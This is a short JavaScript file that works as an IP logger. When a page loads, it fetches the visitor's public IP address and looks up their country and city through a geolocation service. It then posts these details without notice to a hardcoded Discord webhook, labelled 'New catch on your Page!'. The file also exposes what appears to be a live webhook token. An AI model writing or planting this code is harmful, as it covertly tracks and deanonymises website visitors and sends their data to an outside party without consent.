function sendIPToDiscord(ipAddress, location, device) {
    const webhookURL = "https://discord.com/api/webhooks/1130874931836633118/iPSodLf_QHFQpM_8_Ai4715BsHITxdDrbYHlZHwRU_6-KRigiTSb1UKKQB9qFoAU9RYc";

    const embedData = {
        color: 16769485,
        author: {
            name: "IP Logging test",
        },
        title: "New catch on your Page!",
        description: `**IP Address:**\n> ${ipAddress}\n**Location:**\n> ${location}\n**Device:**\n> ${device}`,
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ embeds: [embedData] }),
    });
}

async function getLocationFromIP(ipAddress) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ipAddress}`);
        const data = await response.json();
        return data.city ? `${data.country}, ${data.city}` : data.country;
    } catch (error) {
        console.error("Error fetching location data:", error);
        return "Unknown";
    }
}

function getDeviceInfo() {
    return "Desktop";
}

window.addEventListener("load", async () => {
    try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        const ipAddress = data.ip;

        const location = await getLocationFromIP(ipAddress);
        const device = getDeviceInfo();

        sendIPToDiscord(ipAddress, location, device);
    } catch (error) {
        console.error("Error fetching IP address:", error);
    }
});
